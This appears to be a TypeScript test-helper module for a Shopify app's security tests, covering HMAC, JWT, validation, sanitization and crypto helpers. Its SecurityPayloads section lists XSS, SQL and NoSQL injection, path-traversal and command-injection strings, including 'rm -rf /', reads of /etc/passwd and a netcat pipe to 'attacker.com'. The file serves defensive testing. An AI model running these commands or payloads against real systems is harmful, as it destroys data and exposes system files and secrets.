import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { z } from 'zod';
import createDOMPurify from 'isomorphic-dompurify';

/**
 * Security testing utilities and helpers
 */

// Environment variables with defaults for testing
export const TEST_CONFIG = {
  WEBHOOK_SECRET: process.env.SHOPIFY_WEBHOOK_SECRET || 'test-webhook-secret',
  API_SECRET: process.env.SHOPIFY_API_SECRET || 'test-api-secret',
  API_KEY: process.env.SHOPIFY_API_KEY || 'test-api-key',
  APP_URL: process.env.SHOPIFY_APP_URL || 'https://test-app.example.com',
  ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('base64')
};

/**
 * HMAC Generation Helpers
 */
export const HMACUtils = {
  // Generate webhook HMAC (base64)
  generateWebhookHMAC(body: string | Buffer, secret: string = TEST_CONFIG.WEBHOOK_SECRET): string {
    const bodyBuffer = Buffer.isBuffer(body) ? body : Buffer.from(body);
    return crypto.createHmac('sha256', secret)
      .update(bodyBuffer)
      .digest('base64');
  },

  // Generate OAuth HMAC (hex)
  generateOAuthHMAC(params: URLSearchParams, secret: string = TEST_CONFIG.API_SECRET): string {
    const sortedParams = new URLSearchParams();
    Array.from(params.entries())
      .filter(([key]) => key !== 'hmac')
      .sort((a, b) => a[0].localeCompare(b[0]))
      .forEach(([key, value]) => sortedParams.append(key, value));

    return crypto.createHmac('sha256', secret)
      .update(sortedParams.toString())
      .digest('hex');
  },

  // Verify HMAC with timing-safe comparison
  verifyHMAC(computed: string, provided: string): boolean {
    if (!computed || !provided) return false;

    const computedBuffer = Buffer.from(computed);
    const providedBuffer = Buffer.from(provided);

    if (computedBuffer.length !== providedBuffer.length) {
      return false;
    }

    return crypto.timingSafeEqual(computedBuffer, providedBuffer);
  }
};

/**
 * JWT Token Helpers
 */
export const JWTUtils = {
  // Create Shopify session token
  createSessionToken(overrides: Partial<Record<string, any>> = {}): string {
    const now = Math.floor(Date.now() / 1000);
    const claims = {
      iss: "https://test-shop.myshopify.com/admin",
      dest: "https://test-shop.myshopify.com",
      aud: TEST_CONFIG.API_KEY,
      sub: "user-123456",
      exp: now + 60, // 1 minute expiry (Shopify standard)
      nbf: now - 10,
      iat: now - 10,
      jti: `session-${crypto.randomBytes(8).toString('hex')}`,
      sid: `sid-${crypto.randomBytes(8).toString('hex')}`,
      ...overrides
    };

    return jwt.sign(claims, TEST_CONFIG.API_SECRET, { algorithm: 'HS256' });
  },

  // Validate session token
  validateToken(token: string, options: any = {}): { valid: boolean; payload?: any; error?: string } {
    try {
      const payload = jwt.verify(token, TEST_CONFIG.API_SECRET, {
        algorithms: ['HS256'],
        audience: TEST_CONFIG.API_KEY,
        ...options
      });
      return { valid: true, payload };
    } catch (error) {
      return {
        valid: false,
        error: error instanceof Error ? error.message : 'Invalid token'
      };
    }
  },

  // Create expired token
  createExpiredToken(secondsAgo: number = 120): string {
    const now = Math.floor(Date.now() / 1000);
    return JWTUtils.createSessionToken({
      exp: now - secondsAgo,
      iat: now - secondsAgo - 60,
      nbf: now - secondsAgo - 60
    });
  }
};

/**
 * Shop Domain Validation
 */
export const ShopValidation = {
  // Validate Shopify domain format
  isValidShopDomain(domain: string): boolean {
    if (!domain || typeof domain !== 'string') return false;
    const regex = /^[a-z0-9][a-z0-9-]*\.myshopify\.com$/i;
    return regex.test(domain);
  },

  // Generate valid test shop domain
  generateShopDomain(prefix: string = 'test'): string {
    const random = crypto.randomBytes(4).toString('hex');
    return `${prefix}-${random}.myshopify.com`;
  },

  // Common invalid domains for testing
  invalidDomains: [
    'not-a-shop',
    'shop.com',
    'myshopify.com',
    'shop.myshopify.com.evil.com',
    'shop.myshopify.com/path',
    'shop.myshopify.com?query=1',
    'shop.myshopify.com#fragment',
    '../../../etc/passwd',
    'shop.myshopify.com%0a',
    'shop.myshopify.com\n',
    'shop.myshopify.com;ls'
  ]
};

/**
 * XSS and Injection Payloads
 */
export const SecurityPayloads = {
  // XSS test vectors
  xss: [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload=alert(1)>',
    '<div onclick=alert(1)>Click</div>',
    '<<script>alert(1)//',
    '<scr<script>ipt>alert(1)</scr</script>ipt>'
  ],

  // SQL injection payloads
  sqlInjection: [
    "'; DROP TABLE customers; --",
    "1' OR '1'='1",
    "\" OR \"\"=\"",
    "` OR 1=1 /*",
    "Robert'); DROP TABLE customers;--",
    "admin'--",
    "' OR 1=1--",
    "' UNION SELECT * FROM users--",
    "1' ORDER BY 1--"
  ],

  // NoSQL injection payloads
  noSqlInjection: [
    { $gt: '' },
    { $ne: null },
    { $where: 'this.password == "test"' },
    { $regex: '.*' },
    { $exists: true }
  ],

  // Command injection payloads
  commandInjection: [
    '; rm -rf /',
    '&& cat /etc/passwd',
    '| nc attacker.com 1234',
    '$(whoami)',
    '`ls -la`',
    '\nls',
    '\x00cat /etc/passwd'
  ],

  // Path traversal payloads
  pathTraversal: [
    '../../etc/passwd',
    '../../../windows/system32',
    'uploads/../../../etc/shadow',
    '....//....//etc/passwd',
    '..;/etc/passwd',
    '~/../../etc/passwd',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
  ]
};

/**
 * Data Generation Helpers
 */
export const DataGenerators = {
  // Generate test customer data
  customer(overrides: any = {}) {
    return {
      id: crypto.randomUUID(),
      email: `customer-${crypto.randomBytes(4).toString('hex')}@example.com`,
      firstName: 'Test',
      lastName: 'Customer',
      storeCreditBalance: Math.floor(Math.random() * 1000),
      totalSpent: Math.floor(Math.random() * 10000),
      ...overrides
    };
  },

  // Generate webhook body
  webhookBody(topic: string, data: any = {}) {
    const defaultData: Record<string, any> = {
      'orders/paid': {
        id: Math.floor(Math.random() * 1000000),
        email: 'customer@example.com',
        total_price: '100.00',
        currency: 'USD'
      },
      'customers/create': {
        id: Math.floor(Math.random() * 1000000),
        email: 'new@example.com',
        first_name: 'New',
        last_name: 'Customer'
      },
      'app/uninstalled': {
        shop_domain: 'test-shop.myshopify.com'
      }
    };

    return JSON.stringify({
      ...defaultData[topic] || {},
      ...data
    });
  },

  // Generate OAuth callback params
  oauthParams(overrides: any = {}) {
    const timestamp = Math.floor(Date.now() / 1000).toString();
    const state = 'nonce-' + crypto.randomBytes(16).toString('hex');

    const params = new URLSearchParams({
      shop: 'test-shop.myshopify.com',
      code: 'auth-code-' + crypto.randomBytes(16).toString('hex'),
      state,
      timestamp,
      ...overrides
    });

    // Add valid HMAC
    const hmac = HMACUtils.generateOAuthHMAC(params);
    params.set('hmac', hmac);

    return params;
  }
};

/**
 * Sanitization Helpers
 */
export const SanitizationUtils = {
  // Initialize DOMPurify
  DOMPurify: createDOMPurify(),

  // Sanitize HTML
  sanitizeHTML(dirty: string): string {
    return this.DOMPurify.sanitize(dirty);
  },

  // Sanitize for plain text (no HTML allowed)
  sanitizePlainText(text: string): string {
    return this.DOMPurify.sanitize(text, { ALLOWED_TAGS: [] });
  },

  // Check if string contains XSS
  containsXSS(text: string): boolean {
    const clean = this.sanitizeHTML(text);
    return clean !== text;
  },

  // Redact sensitive data for logging
  redactSensitive(data: any): any {
    const str = JSON.stringify(data);
    return JSON.parse(
      str
        .replace(/shpat_[a-zA-Z0-9_-]+/g, 'shpat_[REDACTED]')
        .replace(/shpss_[a-zA-Z0-9_-]+/g, 'shpss_[REDACTED]')
        .replace(/"password":\s*"[^"]+"/g, '"password":"[REDACTED]"')
        .replace(/"token":\s*"[^"]+"/g, '"token":"[REDACTED]"')
        .replace(/"apiKey":\s*"[^"]+"/g, '"apiKey":"[REDACTED]"')
    );
  }
};

/**
 * Validation Schemas
 */
export const ValidationSchemas = {
  // Email validation schema
  email: z.string().email().toLowerCase().trim(),

  // Shop domain validation schema
  shopDomain: z.string().refine(
    ShopValidation.isValidShopDomain,
    'Invalid Shopify domain'
  ),

  // UUID validation schema
  uuid: z.string().uuid(),

  // Safe filename schema
  filename: z.string().regex(/^[a-zA-Z0-9_.-]+$/, 'Invalid filename'),

  // Password complexity schema
  password: z.string()
    .min(8, 'Password must be at least 8 characters')
    .regex(/[A-Z]/, 'Must contain uppercase letter')
    .regex(/[a-z]/, 'Must contain lowercase letter')
    .regex(/[0-9]/, 'Must contain number')
    .regex(/[^A-Za-z0-9]/, 'Must contain special character'),

  // Currency amount schema
  amount: z.number().min(0).max(999999.99).multipleOf(0.01)
};

/**
 * Timing Attack Test Helpers
 */
export const TimingTestUtils = {
  // Measure function execution time
  async measureTime(fn: () => void | Promise<void>, iterations: number = 1000): Promise<{
    mean: number;
    stdDev: number;
    min: number;
    max: number;
  }> {
    const times: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const start = process.hrtime.bigint();
      await fn();
      const end = process.hrtime.bigint();
      times.push(Number(end - start) / 1e6); // Convert to ms
    }

    const mean = times.reduce((a, b) => a + b, 0) / times.length;
    const variance = times.reduce((sum, t) => sum + Math.pow(t - mean, 2), 0) / times.length;
    const stdDev = Math.sqrt(variance);

    return {
      mean,
      stdDev,
      min: Math.min(...times),
      max: Math.max(...times)
    };
  },

  // Check if two timing distributions are statistically similar
  areTimingsConstant(times1: number[], times2: number[], threshold: number = 0.5): boolean {
    const mean1 = times1.reduce((a, b) => a + b, 0) / times1.length;
    const mean2 = times2.reduce((a, b) => a + b, 0) / times2.length;

    return Math.abs(mean1 - mean2) < threshold;
  }
};

/**
 * Mock Request/Response Helpers
 */
export const MockHttpUtils = {
  // Create mock webhook request
  createWebhookRequest(topic: string, body: any, shop: string = 'test-shop.myshopify.com') {
    const bodyString = JSON.stringify(body);
    const hmac = HMACUtils.generateWebhookHMAC(bodyString);

    return {
      method: 'POST',
      headers: {
        'x-shopify-topic': topic,
        'x-shopify-hmac-sha256': hmac,
        'x-shopify-shop-domain': shop,
        'x-shopify-webhook-id': crypto.randomUUID(),
        'x-shopify-triggered-at': new Date().toISOString(),
        'x-shopify-api-version': '2024-01',
        'content-type': 'application/json'
      },
      body: bodyString
    };
  },

  // Create authenticated request with session token
  createAuthenticatedRequest(path: string, options: any = {}) {
    const token = JWTUtils.createSessionToken();

    return {
      method: options.method || 'GET',
      path,
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json',
        ...options.headers
      },
      body: options.body ? JSON.stringify(options.body) : undefined
    };
  }
};

/**
 * Encryption/Decryption Test Helpers
 */
export const CryptoUtils = {
  // AES-256-GCM encryption
  encrypt(text: string, key: string = TEST_CONFIG.ENCRYPTION_KEY): string {
    const keyBuffer = Buffer.from(key, 'base64');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', keyBuffer, iv);

    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    const authTag = cipher.getAuthTag();

    return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
  },

  // AES-256-GCM decryption
  decrypt(encryptedText: string, key: string = TEST_CONFIG.ENCRYPTION_KEY): string {
    const keyBuffer = Buffer.from(key, 'base64');
    const parts = encryptedText.split(':');

    const iv = Buffer.from(parts[0], 'hex');
    const authTag = Buffer.from(parts[1], 'hex');
    const encrypted = parts[2];

    const decipher = crypto.createDecipheriv('aes-256-gcm', keyBuffer, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  },

  // Generate secure random token
  generateSecureToken(length: number = 32): string {
    return crypto.randomBytes(length).toString('hex');
  }
};

export default {
  HMACUtils,
  JWTUtils,
  ShopValidation,
  SecurityPayloads,
  DataGenerators,
  SanitizationUtils,
  ValidationSchemas,
  TimingTestUtils,
  MockHttpUtils,
  CryptoUtils,
  TEST_CONFIG
};